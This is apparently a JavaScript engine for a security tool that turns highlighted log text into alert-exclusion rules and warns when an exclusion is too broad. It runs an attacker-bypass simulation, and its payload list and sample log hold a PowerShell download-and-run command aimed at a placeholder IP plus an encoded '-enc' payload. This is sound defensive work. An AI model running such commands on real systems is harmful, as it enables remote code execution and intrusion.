// Highlight tuner engine (SK.hl): turn highlighted text into exclusion conditions, then challenge them.
// Builds on SK.tuner (log parser, risk tests). Pure functions: no network, no storage.
(function () {
  var SK = window.SK = window.SK || {};
  var X = SK.tuner;
  var H = SK.hl = {};

  function lower(s) { return String(s == null ? '' : s).toLowerCase(); }
  function base(p) { var s = String(p || ''); return s.slice(Math.max(s.lastIndexOf('\\'), s.lastIndexOf('/')) + 1); }

  /* ---------------------------------------------------------------- field names (raw log field -> UDM) */

  var UDM_START = /^(principal|target|src|observer|about|intermediary|metadata|network|security_result|extensions|additional)\b/;
  var RAW2UDM = {
    image: 'target.process.file.full_path', newprocessname: 'target.process.file.full_path', processname: 'target.process.file.full_path',
    commandline: 'target.process.command_line', processcommandline: 'target.process.command_line',
    parentimage: 'principal.process.file.full_path', parentprocessname: 'principal.process.file.full_path',
    parentcommandline: 'principal.process.command_line',
    user: 'principal.user.userid', username: 'principal.user.userid', subjectusername: 'principal.user.userid', accountname: 'principal.user.userid',
    targetusername: 'target.user.userid',
    computer: 'principal.hostname', computername: 'principal.hostname', hostname: 'principal.hostname', host: 'principal.hostname', devicename: 'principal.hostname',
    sourceip: 'principal.ip', srcip: 'principal.ip', sourceaddress: 'principal.ip', ipaddress: 'principal.ip',
    destinationip: 'target.ip', destip: 'target.ip', dstip: 'target.ip', destinationaddress: 'target.ip',
    destinationport: 'target.port', sourceport: 'principal.port',
    destinationhostname: 'target.hostname', queryname: 'network.dns.questions.name',
    targetfilename: 'target.file.full_path', targetobject: 'target.registry.registry_key',
    sha256: 'target.file.sha256', md5: 'target.file.md5', sha1: 'target.file.sha1',
    company: 'target.file.pe_file.company', originalfilename: 'target.file.pe_file.original_file',
    signer: 'target.file.pe_file.signature_info.signer', signature: 'target.file.pe_file.signature_info.signer'
  };

  H.udmFor = function (key) {
    var k = String(key);
    if (UDM_START.test(k)) return k.replace(/\[\d+\]/g, '');
    var leaf = lower(k.slice(k.lastIndexOf('.') + 1)).replace(/[\s_\-]/g, '');
    return RAW2UDM[leaf] || '';
  };

  H.looksLikeUdm = function (events) {
    var n = 0, t = 0;
    events.forEach(function (ev) { Object.keys(ev).forEach(function (k) { t++; if (UDM_START.test(k)) n++; }); });
    return t > 0 && n / t > 0.5;
  };

  /* ---------------------------------------------------------------- conditions */

  var MODES = ['exact', 'startswith', 'endswith', 'contains', 'regex'];
  H.MODES = MODES;

  // A selection from offsets [a, b) inside a value becomes the narrowest condition that describes it.
  H.condFromSelection = function (key, value, a, b) {
    var v = String(value), sel = v.slice(a, b);
    var mode = 'contains';
    if (a <= 0 && b >= v.length) mode = 'exact';
    else if (a <= 0) mode = 'startswith';
    else if (b >= v.length) mode = 'endswith';
    return { key: key, udm: H.udmFor(key), mode: mode, value: sel };
  };

  H.matchCond = function (c, ev) {
    if (!Object.prototype.hasOwnProperty.call(ev, c.key)) return false;
    var v = lower(ev[c.key]), t = lower(c.value);
    if (c.value === '') return false;
    switch (c.mode) {
      case 'exact': return v === t;
      case 'startswith': return v.indexOf(t) === 0;
      case 'endswith': return v.length >= t.length && v.slice(v.length - t.length) === t;
      case 'contains': return v.indexOf(t) >= 0;
      case 'regex':
        try { return new RegExp(c.value, 'i').test(String(ev[c.key])); } catch (e) { return false; }
    }
    return false;
  };
  H.matchAll = function (conds, ev) {
    if (!conds.length) return false;
    for (var i = 0; i < conds.length; i++) if (!H.matchCond(conds[i], ev)) return false;
    return true;
  };

  // Where inside a value does a condition match? Used to paint the highlight.
  H.span = function (c, value) {
    var v = String(value), lv = lower(v), t = lower(c.value);
    if (!c.value) return null;
    if (c.mode === 'exact') return lv === t ? [0, v.length] : null;
    if (c.mode === 'startswith') return lv.indexOf(t) === 0 ? [0, t.length] : null;
    if (c.mode === 'endswith') return (lv.length >= t.length && lv.slice(lv.length - t.length) === t) ? [lv.length - t.length, lv.length] : null;
    if (c.mode === 'contains') { var i = lv.indexOf(t); return i >= 0 ? [i, i + t.length] : null; }
    try { var m = new RegExp(c.value, 'i').exec(v); return m && m[0].length ? [m.index, m.index + m[0].length] : null; } catch (e) { return null; }
  };

  /* ---------------------------------------------------------------- the challenge */

  var BROAD_ROLES = { user: 1, host: 1, srcIp: 1, dstIp: 1, signer: 1 };
  var COMMON_BINARIES = /^(powershell|pwsh|cmd|wscript|cscript|mshta|rundll32|regsvr32|certutil|bitsadmin|msiexec|wmic|svchost|python\d*|curl|wget|schtasks|net1?|reg|sc|whoami|nltest|cscript|msbuild|installutil|conhost|explorer|winword|excel|outlook|powerpnt|chrome|msedge|firefox|java|node|bash|sh|ssh|scp|7z|winrar|rar|zip)(\.exe)?$/i;
  var WRITABLE = /[\\\/](appdata|temp|tmp|downloads|users[\\\/]public|programdata|windows[\\\/]temp|\$recycle\.bin)[\\\/]/i;
  var VOLATILE_KEY = /(^|[._\- ])(pid|ppid|processid|threadid|logonid|sessionid|guid|recordid|timestamp|time|date|utctime|id)$/i;
  var COMMON_WORD = /^(the|and|true|false|null|none|system|admin|user|users|windows|program files|c:|c:\\|\\|\/|\.exe|\.dll|\.ps1|-file|-command|-nop|-w)$/i;

  function rolesOf(ev) { return X.rolesOf(ev); }

  function riskTitles(ev) {
    var r = rolesOf(ev), flags = X.flagsFor(ev, r) || [];
    return flags.map(function (f) { return f.title; });
  }

  // Copies an event with one field changed.
  function variant(ev, key, value) { var o = {}; Object.keys(ev).forEach(function (k) { o[k] = ev[k]; }); o[key] = value; return o; }

  var PAYLOADS = [
    { label: 'the same command with an encoded PowerShell payload added', apply: function (v) { return v + ' -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA'; }, role: 'cmd' },
    { label: 'the same command with a download-and-run added', apply: function (v) { return v + " ; IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a.ps1')"; }, role: 'cmd' },
    { label: 'the same program copied to C:\\Users\\Public\\', apply: function (v) { return 'C:\\Users\\Public\\' + base(v); }, role: 'image' },
    { label: 'the same parent program copied to C:\\Users\\Public\\', apply: function (v) { return 'C:\\Users\\Public\\' + base(v); }, role: 'parentImage' }
  ];

  // conds: [{key, udm, mode, value}], fp / alerting: arrays of event objects.
  H.challenge = function (conds, fp, alerting) {
    var out = [];
    function add(level, title, detail) { out.push({ level: level, title: title, detail: detail }); }
    var i;

    if (!conds.length) { add('block', 'Nothing is highlighted yet', 'Select text in the false-positive log, or click a field name to use its whole value.'); return { findings: out, verdict: 'block', fpHit: 0, aHit: 0 }; }

    // Bad patterns first (so the user fixes them before anything else).
    var regexBroken = false;
    conds.forEach(function (c) {
      var label = (c.udm || c.key) + ' ' + c.mode + ' "' + c.value + '"';
      if (!c.value) { add('block', 'Empty value for ' + (c.udm || c.key), 'An empty highlight matches nothing useful. Remove it or select some text.'); return; }
      if (c.mode === 'regex') {
        try { new RegExp(c.value, 'i'); } catch (e) { regexBroken = true; add('block', 'Regular expression does not compile', label + ' is not a valid pattern.'); return; }
        if (/^\.[*+]|^\^?\.[*+]|\.[*+]$/.test(c.value)) add('warn', 'Regular expression starts or ends with a wildcard', label + ' can match far more than the text you highlighted. Anchor it with ^ and $ or use exact.');
        if (/^\.\*$|^\.\+$/.test(c.value)) add('block', 'Regular expression matches everything', label + ' would exclude every event.');
      }
      if (c.mode !== 'exact' && c.mode !== 'regex' && c.value.length < 6) add('warn', 'Very short highlight', label + ' is only ' + c.value.length + ' character(s). Short fragments tend to appear inside attacker commands and paths too.');
      if (c.mode === 'contains') add('warn', '"Contains" matches anywhere in the value', label + ' also matches any value that merely includes this text, including one an attacker builds on purpose. Prefer exact, or anchor it to the start or end.');
      if (COMMON_WORD.test(c.value.trim())) add('warn', 'Common word or fragment', label + ' is too generic to identify one specific, known-good activity.');
      if (VOLATILE_KEY.test(c.key)) add('warn', 'Field changes every time', c.key + ' (an ID or time) will not match next time, so the exclusion would stop working. It also tells you nothing about what the activity is.');
      if (WRITABLE.test(c.value)) add('warn', 'Folder any user can write to', label + ' is in a place users and malware can drop files. Legitimate software normally runs from Program Files or System32.');
    });

    // Which events would be hidden?
    var fpHit = fp.filter(function (e) { return H.matchAll(conds, e); });
    var aHit = alerting.filter(function (e) { return H.matchAll(conds, e); });
    if (!regexBroken && !fpHit.length) add('block', 'This would not hide any of your false-positive events', 'The highlighted text does not match all together in any event of the false-positive log. Check the mode and value.');
    if (aHit.length) add('block', 'This would also hide ' + aHit.length + ' of ' + alerting.length + ' event(s) in your alerting log', 'The alerting log is what the rule is supposed to catch. If it matches your exclusion, the exclusion is too broad. Add another field that tells them apart (for example the parent program or the full command).');

    // Risky events inside what would be hidden.
    var seen = {};
    fpHit.concat(aHit).forEach(function (ev) { riskTitles(ev).forEach(function (t) { seen[t] = (seen[t] || 0) + 1; }); });
    Object.keys(seen).forEach(function (t) { add('block', 'Would hide risky activity: ' + t, seen[t] + ' of the events this would hide match this pattern. Investigate it instead of tuning it out.'); });

    // Only broad fields?
    var broadOnly = conds.every(function (c) { return BROAD_ROLES[X.roleOf(c.key)] || /(^|\.)(hostname|userid|user\.name|ip)$/i.test(c.udm || ''); });
    if (broadOnly) add('block', 'Only broad fields are highlighted', 'A user name, host or address on its own describes who or where, not what happened. Excluding it hides everything that user, host or address does, including an attacker using that account or machine.');
    var imageOnly = conds.every(function (c) { return X.roleOf(c.key) === 'image'; });
    if (imageOnly && conds.some(function (c) { return COMMON_BINARIES.test(base(c.value)); }) && conds.every(function (c) { return c.mode !== 'exact' || COMMON_BINARIES.test(base(c.value)); })) {
      add('block', 'A built-in or common program on its own', 'Excluding a shell, script host or common program by name hides every use of it, good or bad. Add what it was doing (parent program, command line).');
    }
    if (conds.length === 1 && !broadOnly) {
      var r1 = X.roleOf(conds[0].key);
      if (r1 !== 'hash' && !(r1 === 'cmd' && conds[0].mode === 'exact')) add('warn', 'Only one field', 'Most safe exclusions pair two or three facts (for example parent program plus full command line, plus host). One field is easier for an attacker to match by accident.');
    }

    // Attacker-reuse simulation: would a worse version of each hidden event slip through the same exclusion?
    var done = {};
    fpHit.slice(0, 12).forEach(function (ev) {
      var names = rolesOf(ev).names;
      PAYLOADS.forEach(function (p) {
        var key = names[p.role];
        if (!key || done[p.label]) return;
        var v = ev[key];
        if (v == null || v === '') return;
        var bad = variant(ev, key, p.apply(String(v)));
        if (H.matchAll(conds, bad)) {
          done[p.label] = true;
          add(p.role === 'cmd' ? 'block' : 'warn', 'Attacker bypass: ' + p.label, 'If someone ran ' + p.label + ', your exclusion would still match it and the alert would be hidden. ' + (p.role === 'cmd' ? 'Pin the command line (exact, or a regular expression anchored with ^ and $) so extra arguments break the match.' : 'Add a condition on ' + key + ' (equals the full path) so a copy elsewhere breaks the match.'));
        }
      });
    });

    // Scope notes.
    var covered = fp.length ? Math.round(fpHit.length * 100 / fp.length) : 0;
    if (fpHit.length && fpHit.length < fp.length) add('info', 'Hides ' + fpHit.length + ' of ' + fp.length + ' false-positive events (' + covered + '%)', 'The rest keep alerting. If they are the same noise, highlight what they share too.');
    var hasWho = conds.some(function (c) { var r = X.roleOf(c.key); return r === 'host' || r === 'user' || r === 'srcIp' || /hostname|userid|(^|\.)ip$/.test(c.udm || ''); });
    if (!hasWho && fpHit.length) add('info', 'Applies to every host and user', 'Nothing limits this to the machines or accounts where the noise comes from. If the activity is tied to certain servers, add the host as a condition.');

    var verdict = 'ok';
    out.forEach(function (f) { if (f.level === 'block') verdict = 'block'; else if (f.level === 'warn' && verdict !== 'block') verdict = 'warn'; });
    return { findings: out, verdict: verdict, fpHit: fpHit.length, aHit: aHit.length, fpHitIdx: fpHit, aHitIdx: aHit };
  };

  /* ---------------------------------------------------------------- writers */

  function q(s) { return '"' + String(s).replace(/\\/g, '\\\\').replace(/"/g, '\\"') + '"'; }
  function escRe(s) { return X.escapeRegex(s); }
  function yamlQ(s) { return "'" + String(s).replace(/'/g, "''") + "'"; }
  function fld(c, fmt) { return fmt === 'chronicle' || fmt === 'yaral' ? (c.udm || c.key) : c.key; }

  H.FORMATS = [
    { id: 'chronicle', label: 'Google SecOps (Chronicle) rule exclusion' },
    { id: 'yaral', label: 'YARA-L 2.0 (your own rules)' },
    { id: 'sigma', label: 'Sigma filter' },
    { id: 'splunk', label: 'Splunk (SPL)' },
    { id: 'kql', label: 'Kusto (Sentinel / Defender)' },
    { id: 'generic', label: 'Plain language' }
  ];

  H.write = function (format, conds, meta) {
    meta = meta || {};
    var L = [], c;
    var head = [];
    head.push('Tuning exclusion' + (meta.ref ? ' ' + meta.ref : ''));
    if (meta.owner) head.push('Owner: ' + meta.owner);
    if (meta.reviewBy) head.push('Review or remove by: ' + meta.reviewBy);
    if (meta.basis) head.push('Based on: ' + meta.basis);
    var cm = (format === 'splunk' || format === 'kql' || format === 'yaral') ? '// ' : '# ';

    function comments() { return head.map(function (h) { return format === 'splunk' ? '`comment("' + h.replace(/"/g, "'") + '")`' : cm + h; }); }

    if (format === 'chronicle') {
      L = comments();
      L.push('');
      L.push('A. In the Google SecOps UI: Detection > Rules and Detections > open the rule > Rule Options > Exclude.');
      L.push('   (Rule exclusions apply to Google curated detections. Statements added with "+ Conditional Statement" are ANDed;');
      L.push('   several values on one row are ORed.) Google documents the operators IS and CONTAINS for this screen.');
      conds.forEach(function (c, i) {
        var f = c.udm || '<fill in the UDM field for ' + c.key + '>';
        if (c.mode === 'exact') L.push('   ' + (i + 1) + '. ' + f + '  IS  ' + c.value);
        else if (c.mode === 'contains') L.push('   ' + (i + 1) + '. ' + f + '  CONTAINS  ' + c.value);
        else L.push('   ' + (i + 1) + '. ' + f + ': "' + ({ startswith: 'starts with', endswith: 'ends with', regex: 'regular expression' })[c.mode] + '" is not a documented operator on this screen. Use the query in B, or an IS with the full value.');
      });
      L.push('');
      L.push('B. As an API exclusion (findingsRefinements "query" field, UDM search syntax; AND between conditions):');
      var qparts = conds.map(function (c) {
        var f = c.udm || '<udm field for ' + c.key + '>';
        if (c.mode === 'exact') return f + ' = ' + q(c.value) + ' nocase';
        var re = c.mode === 'startswith' ? '^' + escRe(c.value) : (c.mode === 'endswith' ? escRe(c.value) + '$' : (c.mode === 'contains' ? escRe(c.value) : c.value));
        return f + ' = /' + re.replace(/\//g, '\\/') + '/ nocase';
      });
      L.push('   ' + qparts.join(' and '));
      L.push('');
      L.push('Then run the exclusion test (past two weeks of detections) and confirm only the false positives disappear before enabling it.');
      return L.join('\n');
    }
    if (format === 'yaral') {
      L = comments();
      L.push('// For your own YARA-L rules. Add this line inside the events: section, after the matching conditions.');
      L.push('// An event is kept (not excluded) when ANY condition differs, which is the same as excluding only when ALL match.');
      L.push('// Uses only constructs shown in the YARA-L reference: != "x" nocase, not re.regex(field, `p`) nocase, "or", parentheses.');
      var parts = conds.map(function (c) {
        var f = '$e.' + fld(c, 'yaral');
        if (c.mode === 'exact') return f + ' != ' + q(c.value) + ' nocase';
        var re = c.mode === 'startswith' ? '^' + escRe(c.value) : (c.mode === 'endswith' ? escRe(c.value) + '$' : (c.mode === 'contains' ? escRe(c.value) : c.value));
        return 'not re.regex(' + f + ', `' + re.replace(/`/g, '') + '`) nocase';
      });
      L.push(parts.length === 1 ? parts[0] : '(' + parts.join(' or ') + ')');
      return L.join('\n');
    }
    if (format === 'sigma') {
      L = comments();
      L.push('# Add as a second selection and change the rule condition to: selection and not exclusion');
      L.push('exclusion:');
      conds.forEach(function (c) {
        var m = { exact: '', startswith: '|startswith', endswith: '|endswith', contains: '|contains', regex: '|re' }[c.mode];
        L.push('    ' + c.key.replace(/[\[\]]/g, '') + m + ': ' + yamlQ(c.value));
      });
      return L.join('\n');
    }
    if (format === 'splunk') {
      L = comments();
      var sp = conds.map(function (c) {
        var f = c.key.replace(/\s/g, '_');
        if (c.mode === 'regex') return 'match(' + f + ', ' + q(c.value) + ')';
        var v = c.value.replace(/\\/g, '\\\\').replace(/"/g, '\\"');
        var w = { exact: v, startswith: v + '*', endswith: '*' + v, contains: '*' + v + '*' }[c.mode];
        return f + '="' + w + '"';
      });
      var hasRe = conds.some(function (c) { return c.mode === 'regex'; });
      L.push(hasRe ? '| where NOT (' + sp.join(' AND ') + ')' : '| search NOT (' + sp.join(' AND ') + ')');
      return L.join('\n');
    }
    if (format === 'kql') {
      L = comments();
      var kp = conds.map(function (c) {
        var f = c.key.replace(/[^\w]/g, '_'), v = '@"' + c.value.replace(/"/g, '""') + '"';
        return { exact: f + ' =~ ' + v, startswith: f + ' startswith ' + v, endswith: f + ' endswith ' + v, contains: f + ' contains ' + v, regex: f + ' matches regex ' + v }[c.mode];
      });
      L.push('| where not (' + kp.join(' and ') + ')');
      return L.join('\n');
    }
    L = comments();
    L.push('Do not alert when ALL of these are true:');
    conds.forEach(function (c) { L.push('  - ' + c.key + ' ' + ({ exact: 'equals', startswith: 'starts with', endswith: 'ends with', contains: 'contains', regex: 'matches the pattern' })[c.mode] + ' "' + c.value + '"'); });
    return L.join('\n');
  };

  H.SAMPLE = {
    alerting: [
      '{"UtcTime":"2026-10-22 13:41:17","Computer":"WS-0142","User":"CORP\\\\jsmith","ParentImage":"C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\EXCEL.EXE","Image":"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe","CommandLine":"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"}',
      '{"UtcTime":"2026-10-23 09:12:40","Computer":"WS-0250","User":"CORP\\\\apatel","ParentImage":"C:\\\\Windows\\\\System32\\\\cmd.exe","Image":"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe","CommandLine":"powershell.exe -File C:\\\\Users\\\\Public\\\\run.ps1"}'
    ].join('\n'),
    fp: [
      '{"UtcTime":"2026-10-20 02:00:04","Computer":"SRV-APP01","User":"NT AUTHORITY\\\\SYSTEM","ParentImage":"C:\\\\Program Files\\\\NorthwindBackup\\\\nbagent.exe","Image":"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe","CommandLine":"powershell.exe -File \\"C:\\\\Program Files\\\\NorthwindBackup\\\\scripts\\\\nightly.ps1\\" -Job 4410"}',
      '{"UtcTime":"2026-10-21 02:00:03","Computer":"SRV-APP01","User":"NT AUTHORITY\\\\SYSTEM","ParentImage":"C:\\\\Program Files\\\\NorthwindBackup\\\\nbagent.exe","Image":"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe","CommandLine":"powershell.exe -File \\"C:\\\\Program Files\\\\NorthwindBackup\\\\scripts\\\\nightly.ps1\\" -Job 4411"}',
      '{"UtcTime":"2026-10-21 02:00:08","Computer":"SRV-DB01","User":"NT AUTHORITY\\\\SYSTEM","ParentImage":"C:\\\\Program Files\\\\NorthwindBackup\\\\nbagent.exe","Image":"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe","CommandLine":"powershell.exe -File \\"C:\\\\Program Files\\\\NorthwindBackup\\\\scripts\\\\nightly.ps1\\" -Job 4411"}'
    ].join('\n')
  };
})();
